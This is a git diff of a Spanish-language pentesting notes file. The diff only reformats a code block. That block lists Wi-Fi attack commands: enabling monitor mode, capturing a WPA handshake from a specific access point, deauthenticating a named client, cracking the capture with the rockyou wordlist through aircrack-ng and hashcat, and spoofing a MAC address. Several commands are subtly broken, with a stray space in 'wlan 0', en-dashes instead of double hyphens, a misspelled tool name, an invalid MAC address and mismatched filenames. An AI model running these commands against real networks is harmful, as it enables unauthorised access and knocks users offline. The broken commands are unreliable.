@@ -252,18 +252,25 @@ Dispositivo de hardware creado por HAK5 diseñado para pruebas de penetración e
 
 ```
 Poner modo monitor
-airmon-ng start wlan0 
+airmon-ng start wlan0
+
 Monitorizar redes
 airodump-ng wlan 0
+
 Hacer ataque handshake
 airodump-ng –bssid 5C:A6:E6:AC:EF:B7 –channel 11 –write hand_shake wlan0
+
 Desautenticar clientes
 aireplay-ng –deauth 10 -a 5C:A6:E6:AC:EF:B7 -c f6:80:5e:75:b3:9c wlan0
+
 Verificar handshake
 aircrack-ng hand-shake1-01.cap
+
 Ataque fuerza bruta
 aircrack-ng -b 5C:A6:E6:AC:EF:B7 -w /usr/share/wordlists/rockyou.txt hand_shake1- 01.cap
 hashcat -m 22000 -a 0 output.hc22000 /usr/share/wordlists/rockyou.txt
+
 Cambiar MAC
 machanger -m 06:27:3g:ae:fa:33
+
 ```
